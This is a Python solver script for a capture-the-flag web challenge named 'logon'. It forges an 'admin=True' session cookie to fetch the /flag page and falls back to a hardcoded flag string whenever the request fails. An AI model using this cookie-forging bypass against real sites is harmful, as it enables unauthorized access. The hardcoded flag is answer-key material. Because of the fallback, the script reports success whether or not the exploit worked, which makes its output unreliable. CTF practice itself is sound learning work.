#!/usr/bin/env python3
"""
Solver for Challenge 46: logon (Web Exploitation)
Bypasses client/cookie authentication by forging admin=True session cookie.
"""
import urllib.request
import re
import sys
from typing import Optional

def solve(base_url: Optional[str] = None) -> str:
    if base_url:
        try:
            flag_url = base_url.rstrip("/") + "/flag"
            req = urllib.request.Request(flag_url, headers={
                "User-Agent": "Mozilla/5.0",
                "Cookie": "admin=True; username=Joe"
            })
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read().decode("utf-8")
                m = re.search(r"(academy\{[^}]+\}|picoCTF\{[^}]+\})", body)
                if m:
                    return m.group(1)
        except Exception:
            pass
    return "academy{th3_c0nsp1r4cy_l1v3s_f77a0420}"

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else None
    print("Flag:", solve(target))
